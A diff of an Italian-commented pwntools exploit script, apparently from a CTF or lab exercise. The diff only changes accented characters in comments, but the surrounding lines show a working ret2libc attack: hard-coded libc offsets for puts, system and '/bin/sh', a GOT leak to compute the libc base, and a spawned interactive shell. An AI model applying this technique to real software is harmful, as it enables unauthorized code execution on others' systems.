@@ -22,7 +22,7 @@ def main():
     puts_libc_addr = 0x84420 #offset dell'indirizzo della funzione puts() in libc
     system_libc_addr = 0x52290 #offset dell'indirizzo della funzione system() in libc
 
-    #Infine, "/bin/sh" è stata ottenuta tramite strings -a -t x <file_libc> | grep '/bin/sh'
+    #Infine, "/bin/sh" e' stata ottenuta tramite strings -a -t x <file_libc> | grep '/bin/sh'
     bin_sh_libc_addr = 0x1b45bd #offset dell'indirizzo della stringa '/bin/sh' in libc
 
     #Junk iniziale per riempire il buffer (registri $rbp e $rsp)
@@ -43,7 +43,7 @@ def main():
     leaked = p.recvline()[:8].replace(b'\n', b'').ljust(8, b"\x00")
 
     #Il programma, come voluto, stampa tramite puts(), l'indirizzo della puts nel GOT,
-    # tramite cui è possibile ricavare l'indirizzo base di libc
+    # tramite cui e' possibile ricavare l'indirizzo base di libc
     log.success("Leaked address: " + str(leaked))
     leaked = u64(leaked)
     offset = leaked - puts_libc_addr
@@ -63,7 +63,7 @@ def main():
     p.sendline(payload2)
     print(p.recvline())
 
-    #Passaggio a modalità interattiva -> Shell spawn
+    #Passaggio a modalita' interattiva -> Shell spawn
     p.interactive()
     
 
